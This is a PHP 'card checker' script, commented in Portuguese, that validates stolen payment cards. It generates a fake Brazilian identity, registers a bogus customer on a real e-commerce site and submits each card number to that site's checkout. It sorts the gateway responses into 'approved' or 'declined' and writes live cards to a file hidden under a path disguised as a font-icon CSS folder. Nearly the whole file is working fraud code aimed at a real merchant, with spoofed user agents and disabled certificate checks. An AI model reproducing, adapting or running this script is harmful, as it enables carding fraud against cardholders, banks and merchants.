<?php
session_start();
error_reporting(0);
ignore_user_abort();

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49":"}');
}



$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if ($mes[0] == '0') {
    $mes = $mes[1];
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

if(strpos(file_get_contents("use.fontawesome.com/releases/v5.5.0/css/reteste.txt"), "$cc") !== false){

die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reteste</span><br> $lista <br>Retorno: Matriz Pôdi Hein <br>
 </span><br></b>");}


$file = fopen("use.fontawesome.com/releases/v5.5.0/css/reteste.txt", "a");

fwrite($file, "$cc|$mes|$ano|000\n");

fclose($file);


if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49":""}');
}

#######use em alguns casos######

$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);

#######use em alguns casos######


$cookieFile = "cookie.txt";

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

$handle = fopen($cookieFile, 'w');
fclose($handle);

###############################################
######use em payload que aparece bandeira######

function identifyCreditCard($creditCardNumber)
{
    $cardPatterns = array(
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^5[1-5][0-9]{14}$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'elo' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
    );

    foreach ($cardPatterns as $card => $pattern) {
        if (preg_match($pattern, $creditCardNumber)) {
            return $card;
        }
    }

    return 'Desconhecida';
}

$creditCardNumber = "$cc";
$bandeira = identifyCreditCard($creditCardNumber);


######use em payload que aparece bandeira######
###############################################





###############################################
###############GERAR USER AGENT################
function generateUserAgent() {

    $platforms = [

        'Windows' => [
            'Windows NT 10.0; Win64; x64',
            'Windows NT 10.0; WOW64',
            'Windows NT 6.3; Win64; x64',
            'Windows NT 6.3; WOW64',
            'Windows NT 6.2; Win64; x64',
            'Windows NT 6.2; WOW64',
            'Windows NT 6.1',
            'Windows NT 6.0',
            'Windows NT 5.1',
            'Windows NT 5.0',
        ],
        'Mac' => [
            'Macintosh; Intel Mac OS X 10_14_5',
            'Macintosh; Intel Mac OS X 10_14_0',
            'Macintosh; Intel Mac OS X 10_13_6',
            'Macintosh; Intel Mac OS X 10_13_3',
            'Macintosh; Intel Mac OS X 10_12_6',
            'Macintosh; Intel Mac OS X 10_11_6',
            'Macintosh; Intel Mac OS X 10_10_5',
        ],
        'Linux' => [
            'X11; Linux x86_64',
            'X11; Ubuntu; Linux x86_64',
            'X11; Fedora; Linux x86_64',
            'X11; CentOS; Linux x86_64',
            'X11; Debian; Linux x86_64',
            'X11; Arch Linux; Linux x86_64',
        ],
        'Android' => [
            'Linux; Android 10',
            'Linux; Android 9',
            'Linux; Android 8',
            'Linux; Android 7',
            'Linux; Android 6',
            'Linux; Android 5',
        ]
    ];

    $randomPlatform = array_rand($platforms);
    $randomUserAgent = $platforms[$randomPlatform][array_rand($platforms[$randomPlatform])];
    $rand = random_int(1000, 9999);
    $rand1 = random_int(100, 999);
    $userAgent = 'Mozilla/5.0 (' . $randomUserAgent . ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.' . $rand . '.'.$rand1.' Safari/537.36';

    return $userAgent;
}

$userAgent = generateUserAgent();

###############GERAR USER AGENT################
###############################################

$contador = isset($_SESSION['contador']) ? $_SESSION['contador'] : 0;


$urlpedido = array(

"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GMF48513AGAD0YGDAGA1531/460112",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861G856HUWER097J/492892",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861G73NN1524/174921",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861GE16956135/324003",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861GMF48513AGAD/541192",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861GG5RYWE21861G/442580",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861GG5RYWE21861G0YGDAGA1531/274640",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861G1LGDAG15132GQA6F3GHJMN56/372783",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861G1LGDAG15132GQATL17565FA/331713",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861G1LGDAG15132GQAE16956135/522808",
"TL17565FATL17565FA73NN1524E16956135G5RYWE21861G1LGDAG15132GQAG5RYWE21861G/430452",



);

$indice_atual = isset($_SESSION['indice_atual']) ? $_SESSION['indice_atual'] : 0;
$urltoken_atual = $urlpedido[$indice_atual];

$indice_atual++;
if ($indice_atual >= count($urlpedido)) {
    $indice_atual = 0;
    $contador++;
  /*  if ($contador == 10) {
        die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Seus Tokens Acabaram</span>");
    }*/
}

$_SESSION['indice_atual'] = $indice_atual;
$_SESSION['contador'] = $contador;

;


$gate = getStr($urltoken_atual, '/','/' , 1);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);
$nome = getStr($dados, '"nome":"','"' , 1);
$cpf = getStr($dados, '"cpf":"','"' , 1);
$celular = getStr($dados, '"celular":"','"' , 1);
$email = getStr($dados, '"email":"','"' , 1);
$senha = getStr($dados, '"senha":"','"' , 1);

/////////////////////////////////////////////////////////////////////////////////////////



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/cliente");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: text/html, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/cadastro',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'salvar_cliente=true&idcliente=&idpessoafisica=&idpessoajuridica=&idendereco=&idenderecocliente=&pessoa=fisica&atacado=0&nome=Kleber&sobrenome=Oliveira&cpf='.$cpf.'&rg=&inscricaoprodutorrural=&crm=&sexchb=M&sexo=M&dia=23&mes=07&ano=2002&razaosocial=&nomefantasia=&cnpj=&ie=&apelido=&responsavel=&ddd1=61&telefone1=969699969&ddd2=&telefone2=&email='.$nome.'w6fo5661%40gmail.com&email_confirm=&senha=kleber155&senha_confirm=kleber155&cep1=&cep2=&tipoendereco=&outro=&logradouro=&numero=&complemento=&bairro=&cidade=&uf=');
$registro = curl_exec($ch);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/finalizar-pedido/$urltoken_atual");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'X-Requested-With: mark.via.gp',
'Referer: https://easytdr.com.br/posts/pedido/indefinido/0',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$token1 = curl_exec($ch);







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/pedido-finalizar");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/finalizar-pedido/'.$urltoken_atual.'',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'enviando_via_post=1&formapagto=rede-'.$bandeira.'&numparcelas=1&cartaocredito_num='.$cc.'&cartaocredito_codigo=789&cartaocredito_mes='.$mes.'&cartaocredito_ano='.$ano.'&cartaocredito_nome=Kleber oliveira&cartaocredito_cpf='.$cpf.'&cartaocredito_dtnascimento=23/07/2002&card_hash=&sender_hash=&_cc_chave_=');
$pay = curl_exec($ch);



echo$retorno = getStr($pay, 'Unauthorized. ','*' , 1);


if (strpos($pay, 'Invalid security code')) { 
    
    $file = fopen("use.fontawesome.com/releases/v5.5.0/css/lives.txt", "a");

fwrite($file, "$cc|$mes|$ano|000 -> $retorno\n");

fclose($file);
    
    die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span> $lista  ✓Retorno:  CODIGO DE SEGURANÇA INVÁLIDO <br>GATE:  $gate|$contador vezes <br></span></b>");


} elseif (strpos($pay, 'Expiry date expired')){
    
    $file = fopen("use.fontawesome.com/releases/v5.5.0/css/lives.txt", "a");

fwrite($file, "$cc|$mes|$ano|000 -> $retorno\n");

fclose($file);
    
    die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span> $lista ✓ReturnCode: 54 LIVE INSTAVEL<br>GATE:  $gate|$contador vezes <br></span></b>");

    
} elseif(strpos($pay, 'Contact issuer')){ 
    
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span> $lista <br>Retorno: ENTRE EM CONTATO COM O EMISSOR <br>GATE:  $gate|$contador vezes <br></span></b>");


} elseif(strpos($pay, 'Identified moderate risk by the issuer.')){ 
    
    
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>Retorno: RISCO MODERADO IDENTIFICADO PELO EMISSOR<br>GATE:  $gate|$contador vezes </span><br></b>");
   
 


} elseif(strpos($pay, 'Insufficient funds')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ReturnCode: 51 <br>GATE:  $gate|$contador vezes </span><br></b>");}


########aguardando amex live pra tirar retorno
/*elseif(strpos($pay, '')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span><br> $lista <br>Retorno:  Live INSTÁVEL <br>

GATE: $gate</span><br></b>");}*/

elseif(strpos($pay, 'Deny Category 01')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ANTI-FRAUDE <br>GATE:  $gate|$contador vezes </span><br></b>");}

elseif(strpos($pay, 'Transaction type not allowed for this card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>TIPO DE TRANSAÇÃO NÃO ACEITA PELO CARTÃO <br>GATE:  $gate|$contador vezes </span><br></b>");}

elseif(strpos($pay, 'Card locked')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO BLOQUEADO <br>GATE: $gate</span><br></b>");}

elseif(strpos($pay, 'Please try again')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>PAGAMENTO RECUSADO<br>GATE:  $gate|$contador vezes </span><br></b>");}

elseif(strpos($pay, 'Restricted card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO RESTRITO<br>GATE:  $gate|$contador vezes </span><br></b>");}

elseif(strpos($pay, 'Nonexistent card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO INEXISTENTE<br>GATE:  $gate|$contador vezes </span><br></b>");}

else{ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ERRO DESCONHECIDO  $gate|$indice_atual|$contador vezes <br>
 </span><br></b>");

    
}




/*By: 

GATE: $gate

Deixa os creditos amor s2*/


?>